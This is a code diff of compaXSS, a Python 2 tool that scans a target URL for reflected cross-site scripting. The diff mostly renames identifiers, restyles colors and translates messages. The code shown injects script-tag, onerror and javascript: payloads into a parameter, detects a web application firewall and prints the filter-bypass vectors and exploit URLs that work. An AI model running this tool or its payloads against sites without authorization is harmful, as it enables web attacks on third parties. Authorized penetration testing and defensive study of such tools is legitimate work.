@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 #
 #       
-#         Copyright 2013 @mrjopino - @juan_eljach
+#         Copyright 2013 @jofpin (Fraph) - @juan_eljach
 #
-#   <mrjopino@gmail.com>    <juan_eljach10@hotmail.com>
+#   <jofpin@gmail.com>    <juan_eljach10@hotmail.com>
 #
 #
 #
@@ -20,10 +20,10 @@ from HTMLParser import HTMLParser        #
 from optparse import OptionParser        #                     
 ##########################################
 #
-#Core compaXSS
+# Core compaXSS
 #
-URL = ""
-keyword = "vector"
+URL = " "
+keyword = "-run"
 refleccion = 0 
 parsero = 0
 parser = 0
@@ -34,28 +34,26 @@ ignorar = ['html','head','br','header','nav','meta','footer']
 listavacia = []
 etiquetaAbierta = []
 
-#Colores
-class color:
-    amarillo = '\033[1;33m'
-    azul = '\033[94m'
-    rojo = '\033[91m'
-    verde = '\033[92m'
-    blanco = '\033[0m'
 if "linux" in sys.platform:
     os.system("clear")
 elif "win" in sys.platform:
     os.system("cls")
 else:
     pass
-print color.azul + "\t\t#######################|>\033[1;33mCompaXSS\033[94m<|#########################" + color.blanco
-print color.azul + "\t\t#                       Developers                         #" + color.blanco
-print color.azul + "\t\t##\033[91m+\033[94m=>             @mrjopino - @juan_eljach            <=\033[91m+\033[94m##" + color.blanco
-print color.azul + "\t\t##\033[91m+\033[94m>\033[92m                        XSS                         \033[94m<\033[91m+\033[94m##" + color.blanco
-print color.azul + "\t\t##\033[91m+\033[94m>                       V1.0                         <\033[91m+\033[94m##" + color.blanco
-print color.azul + "\t\t##\033[91m+\033[94m>         ################################           <\033[91m+\033[94m##" + color.blanco
-print color.azul + "\t\t#            #\033[91m+\033[94m>\033[1;31m   Bypass XSS Reflected   \033[94m<\033[91m+\033[94m#              #" + color.blanco
-print color.azul + "\t\t############################################################\n" + color.blanco 
-#Vectores Cross-site scripting (xss) 
+
+# Colors
+color = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}
+
+print color['blue'] + "\t\t#######################|>\033[1;33mCompaXSS\033[94m<|#########################" + color['white']
+print color['blue'] + "\t\t#                       Developers                         #" + color['white']
+print color['blue'] + "\t\t##\033[91m+\033[94m=>              @jofpin - @juan_eljach              <=\033[91m+\033[94m##" + color['white']
+print color['blue'] + "\t\t##\033[91m+\033[94m>\033[92m                        XSS                         \033[94m<\033[91m+\033[94m##" + color['white']
+print color['blue'] + "\t\t##\033[91m+\033[94m>                       V1.0                         <\033[91m+\033[94m##" + color['white']
+print color['blue'] + "\t\t##\033[91m+\033[94m>         ################################           <\033[91m+\033[94m##" + color['white']
+print color['blue'] + "\t\t#            #\033[91m+\033[94m>\033[1;31m   Bypass XSS Reflected   \033[94m<\033[91m+\033[94m#              #" + color['white']
+print color['blue'] + "\t\t############################################################\n" + color['white'] 
+
+# Payloads Cross-site scripting (xss) 
 vectores = [
     "javascript:alert(0);",
     "javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x",
@@ -138,45 +136,45 @@ def main():
     global URL
     URL = options.url
     
-    print "\n\033[1;33mObjetivo:\033[94m " + URL 
-    url_to_waf = str(raw_input("Especifique el dominio para la deteccion de WAF: "))
+    print color['yellow'] + "\nTarget: " + color['blue'] + URL 
+    url_to_waf = str(raw_input("Especifique el dominio para la deteccion de WAF: " + color['white']))
     if not (url_to_waf.startswith('http://') or url_to_waf.startswith('https://')):
         url_to_waf = 'http://' + url_to_waf
     print url_to_waf
     print "Detectando WAF"
     wafw00f.detector(url_to_waf) 
-    print "\n\033[1;33mObjetivo:\033[94m " + URL  
-    print color.verde + "\n[+] Injectando:\033[91m vectores\033[94m...\n" + color.blanco
-    compaXSS = empanada(URL) 
+    print color['yellow'] + "\nObjetivo: " + color['blue'] + URL  
+    print color['green'] + "\n[+] Injectando:\033[91m vectores\033[94m...\n" + color['white']
+    compaXSS = requesty(URL) 
     
     if(keyword.lower() in compaXSS.lower()):
 
         global refleccion
         refleccion = compaXSS.lower().count(keyword.lower())
-        print color.verde + "[+] Verificando" + color.blanco + " Respuestas => \033[1;33m" + str(refleccion) + "\033[0m"
+        print color['green'] + "[+] Verificando" + color['white'] + " Respuestas => " + color['yellow']+ str(refleccion) + color['white']
         
     else:
-        exit(color.rojo + "CONSEJO: " + color.blanco + "Comprobar el valor o salir de compaXSS.\n")
+        exit(color['red'] + "CONSEJO: " + color['white'] + "Comprobar el valor o salir de compaXSS.\n")
     
-    for i in range(refleccion):
-        print color.azul + "\n\nTesting: " + color.blanco + str(i + 1)
+    for niti in range(refleccion):
+        print color['blue'] + "\n\nTesting: " + color['white'] + str(niti + 1)
         global parsero
-        parsero = i+1
+        parsero = niti + 1
         analisis(compaXSS)
         #Las benditas Globales
         global core, cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript, etiquetasabiertas, etiquetaAbierta, parser, etiquetalimpia
         core, etiquetasabiertas, etiquetaAbierta = [], [], []
         cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript = False, False, False, False, False
         parser = 0
-        etiquetalimpia = "" #Nada por aqui
+        etiquetalimpia = " "
     
-    print color.azul + "\n\nVectores Bypasseadores:" + color.blanco
+    print color['blue'] + "\n\nVectores Bypass:" + color['white']
     for payload in listavacia:
         print payload
     
 #Nueva funcion de Verificando datos
 def analisis(compaXSS):
-    print "\nVerificando la keyword: \033[1;31m"+ keyword +"\033[0m"
+    print "\nVerificando la keyword: \033[1;31m" + keyword + color['white']
     location = javascriptHTML(compaXSS)
     if(location == "comment"): #Comprobar si es un form de comentarios
         print "Parece ser un comentario"
@@ -203,16 +201,16 @@ def javascriptHTML(compaXSS):
     except Exception as e:
         location = str(e)
     except:
-        print color.rojo + "ERROR: " + color.blanco + "Algo salio mal, vuelve a ejecutar a compaXSS"
+        print color['red'] + "ERROR: " + color['white'] + "Algo salio mal, vuelve a ejecutar a compaXSS"
     return location
 
-#Mas y mas funciones
+# Mas y mas funciones
 def comprobacionXSS(parametroXSS, comparacion):
     analisisString = "inicio" + parametroXSS + "envio"
     compararString = "inicio" + comparacion + "envio"
     URLweb = URL.replace(keyword, analisisString)
     try:
-        respuesta = empanada(URLweb)
+        respuesta = requesty(URLweb)
     except:
         respuesta = ""
     success = False
@@ -224,18 +222,18 @@ def comprobacionXSS(parametroXSS, comparacion):
             break
     return success
     
-#Funcion empanada
-def empanada(frita):
+# requesty
+def requesty(kisses):
     try:
-        req = urllib2.Request(frita)
+        req = urllib2.Request(kisses)
         resp = urllib2.urlopen(req)
         return resp.read()
     except:
-        print "\n" + color.rojo + "ERROR: " + color.blanco+ "El parametro o la URL es invalida.\n"
+        print "\n" + color['red'] + "ERROR: " + color['white']+ "El parametro o la URL es invalida.\n"
 
 #Funcion de XSS en comentarios
 def comentarios():
-    print color.verde + "[+]" + color.blanco + " XSS Reflejado"
+    print color['green'] + "[+]" + color['white'] + " XSS Reflected"
     payload = "--><script>alert(1);</script>"
     if(comprobacionXSS(payload,payload)):
         payload = "--><script>alert(1);</script>"
@@ -255,15 +253,15 @@ def comentarios():
                     found = True
                     break
             if(not found):
-                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion del vector."
+                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion del vector."
         else:
             payload = ""
-            print color.rojo + "CONSEJO: " + color.blanco + "No es necesario utilizar --> porque no se refleja."
+            print color['red'] + "CONSEJO: " + color['white'] + "No es necesario utilizar --> porque no se refleja."
             
     if(payload):
         if(payload not in listavacia):
             listavacia.append(payload)
-        print color.verde + "[+]" + color.blanco + " Posible vector bypass para el parametro:"
+        print color['green'] + "[+]" + color['white'] + " Posible vector bypass para el parametro:"
         print payload
         print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))
 
@@ -271,7 +269,7 @@ def script():
     print "\nCreo que es mejor utilizar otro metodo para saltarse el XSS"
     
 def datos():
-    print "\n[Puedes insertar el vector solidamente.]"
+    print "\n[Has la prueba en " + color['green'] + "Firefox" + color['white'] + "]"
     payload = "<script>alert(1);</script>"
     if("textarea" in etiquetasabiertas):
         payload = "</textarea>" + payload
@@ -288,17 +286,17 @@ def datos():
                     break
         if(not found):
             payload = ""
-            print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion."
+            print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion."
 
     if(payload):
         if(payload not in listavacia):
             listavacia.append(payload)
-        print color.verde + "[+]" + color.blanco + " XSS Reflejado"
+        print color['green'] + "[+]" + color['white'] + " XSS Reflejado"
         print payload
         print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))
 
 def orientadoATTR():
-    print color.amarillo + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color.blanco
+    print color['yellow'] + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color['white']
     payload = "\"/><script>alert(0);</script>"
     if(comprobacionXSS(payload,payload)):
         payload = "\"/><script>alert(0);</script>" + "\"><img src=x onerror=alert.onerror=alert(0)>"
@@ -318,9 +316,9 @@ def orientadoATTR():
                     break
             if(not found):
                 payload = ""
-                print color.rojo + "CONSEJO: " + color.blanco + "Parece que no hubo un bypass, comprueba manualmente."
+                print color['red'] + "CONSEJO: " + color['white'] + "Parece que no hubo un bypass, comprueba manualmente."
         else:
-            print color.rojo + "MENSAJE:" + color.blanco + " No se puede utilizar /> parece ser solido." #comprobacion de vector javascript:
+            print color['red'] + "MENSAJE:" + color['white'] + " No se puede utilizar /> parece ser solido." #comprobacion de vector javascript:
             invalidez = [
                 "\"></" + etiquetalimpia + "><script>alert(0);</script>",
                 "><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
@@ -340,17 +338,17 @@ def orientadoATTR():
                     break
             if(not found):
                 payload = ""
-                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion."
+                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion."
             
     if(payload):
         if(payload not in listavacia):
             listavacia.append(payload)
-        print color.verde + "MENSAJE: " + color.blanco + "Utiliza el siguiente vector para bypassear el parametro"
+        print color['green'] + "MENSAJE: " + color['white'] + "Utiliza el siguiente vector para bypassear el parametro"
         print payload
-        print "\033[1;33mBypasseado:\033[0m : " + URL.replace(keyword, urllib.quote_plus(payload))
+        print color['yellow'] + "Bypasseado: " + color['white'] + URL.replace(keyword, urllib.quote_plus(payload))
 
 def datosHTML():
-    print color.amarillo + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color.blanco
+    print color['yellow'] + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color['white']
     payload = "\"></" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "><script>alert(1);</script>" + "><script>alert(0);</script>"
     if(comprobacionXSS(payload,payload)):
         if(comprobacionXSS(payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "%20x=\"", payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\"")):
@@ -370,9 +368,9 @@ def datosHTML():
                     break
             if(not found):
                 payload = ""
-                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente el vector, para comprobar la ejecucion"
+                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente el vector, para comprobar la ejecucion"
         else:
-            print color.rojo + "[+]" + color.blanco + " No se puede utilizar \"> parece ser solido."
+            print color['red'] + "[+]" + color['white'] + " No se puede utilizar \"> parece ser solido."
             invalidez = [
                 "\"<div><script>alert(0);</script>",
                 "\"<script>confirm(0);prompt(2);alert(/XSS/.source)</script>",
@@ -390,16 +388,16 @@ def datosHTML():
                     break
             if(not found):
                 payload = ""
-                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion"
+                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion"
               
     if(payload):
         if(payload not in listavacia):
             listavacia.append(payload)
-        print color.verde + "MENSAJE: " + color.blanco + "Verifica la importancia del Bypass o sal de la tool."
+        print color['green'] + "MENSAJE: " + color['white'] + "Verifica la importancia del Bypass o sal de la tool."
         print payload
-        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))
+        print color['yellow'] + "Bypasseado: " + color['white'] + URL.replace(keyword, urllib.quote_plus(payload))
         
-#Clase HTMLcompa conexion con la comprobacion de Datos
+# Clase HTMLcompa comprobacion de Datos
 class HTMLcompa(HTMLParser):
     def handle_comment(self, data):
         global parser
@@ -455,6 +453,6 @@ class HTMLcompa(HTMLParser):
                         raise Exception("html_data")
                 except:
                     raise Exception("html_data")
-                    #Happy Hacking!
+
 if __name__ == "__main__":
     main()
